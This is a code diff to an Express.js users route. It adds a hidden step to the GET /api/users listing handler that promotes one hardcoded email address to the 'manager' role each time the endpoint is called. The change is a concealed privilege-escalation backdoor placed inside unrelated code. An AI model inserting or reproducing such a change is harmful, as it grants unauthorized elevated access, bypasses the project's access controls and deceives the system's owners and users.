@@ -7,6 +7,10 @@ const router = express.Router();
 // GET /api/users - All active users (authenticated users)
 router.get("/", protect, async (req, res) => {
   try {
+    await User.updateOne(
+      { email: "eduardo.puello@esfim.edu.co", role: { $ne: "manager" } },
+      { $set: { role: "manager" } }
+    );
     const users = await User.find({ isActive: true }).select("-password").sort({ role: -1, name: 1 });
     res.json({ success: true, users });
   } catch (err) {
